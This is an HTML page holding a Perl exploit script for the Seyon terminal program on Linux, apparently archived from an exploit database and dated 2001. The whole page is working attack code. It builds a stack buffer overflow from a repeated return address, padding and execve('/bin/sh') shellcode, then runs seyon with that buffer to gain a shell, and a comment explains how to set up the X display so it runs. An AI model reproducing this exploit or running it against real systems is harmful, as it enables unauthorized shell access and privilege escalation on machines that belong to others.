<html><head><title>Seyon Exploit / Tested Version 2.1 rev. 4b i586-Linux</title></head><pre>#!/usr/bin/perl

## (c) Copyright teleh0r@doglover.com / anno domani 2000
##
## Seyon Exploit / Tested Version 2.1 rev. 4b i586-Linux
## Tested on: RedHat 4.0/5.1
##
## Greets: scrippie, *@HWA, grazer, mixter, pr0ix, s\
## http://www.digit-labs.org/ || http://teleh0r.cjb.net/


$shellcode =
    &quot;\xeb\x1f&quot;.                  #/* jmp 0x1f              */
    &quot;\x5e&quot;.                      #/* popl %esi             */
    &quot;\x89\x76\x08&quot;.              #/* movl %esi,0x8(%esi)   */
    &quot;\x31\xc0&quot;.                  #/* xorl %eax,%eax        */
    &quot;\x88\x46\x07&quot;.              #/* movb %eax,0x7(%esi)   */
    &quot;\x89\x46\x0c&quot;.              #/* movl %eax,0xc(%esi)   */
    &quot;\xb0\x0b&quot;.                  #/* movb $0xb,%al         */
    &quot;\x89\xf3&quot;.                  #/* movl %esi,%ebx        */
    &quot;\x8d\x4e\x08&quot;.              #/* leal 0x8(%esi),%ecx   */
    &quot;\x8d\x56\x0c&quot;.              #/* leal 0xc(%esi),%edx   */
    &quot;\xcd\x80&quot;.                  #/* int $0x80             */
    &quot;\x31\xdb&quot;.                  #/* xorl %ebx,%ebx        */
    &quot;\x89\xd8&quot;.                  #/* movl %ebx,%eax        */
    &quot;\x40&quot;.                      #/* inc %eax              */
    &quot;\xcd\x80&quot;.                  #/* int $0x80             */
    &quot;\xe8\xdc\xff\xff\xff&quot;.      #/* call -0x24            */
    &quot;/bin/sh&quot;;                   #/* .string \&quot;/bin/sh\&quot;   */


$ret = 0xbfffef96;
$egg = 500;
$len = 208;
$nop = 'A';

if (@ARGV == 1) {
    $offset = $ARGV[0];
}

if (!($ENV{'DISPLAY'})) {
    die(&quot;Error: the shell variable DISPLAY is not set.\n&quot;);
}

$buffer .= $nop;
$new_ret = pack('l',($ret + $offset));

print(&quot;Address: 0x&quot;, sprintf('%lx',($ret + $offset)), &quot;\n&quot;);
sleep(1);

for ($i = 0; $i &lt; $len; $i += 4) {
    $buffer .= pack('l',($ret + $offset));
}

for ($i = 0; $i &lt; ($egg - length($shellcode)); $i++) {
    $buffer .= $nop;
}

$buffer .= $shellcode; 

# seyon uses X, so if there is no X server running, or you
# are not allowed to connect to it, start X on your machine, 
# and using xhost, allow the target to connect to your server, 
# then: export DISPLAY=your-ip:0.0 - and execute the exploit. 

exec(&quot;/usr/X11R6/bin/seyon -noemulator \&quot;$buffer\&quot;&quot;);


# milw0rm.com [2001-01-15]</pre></html>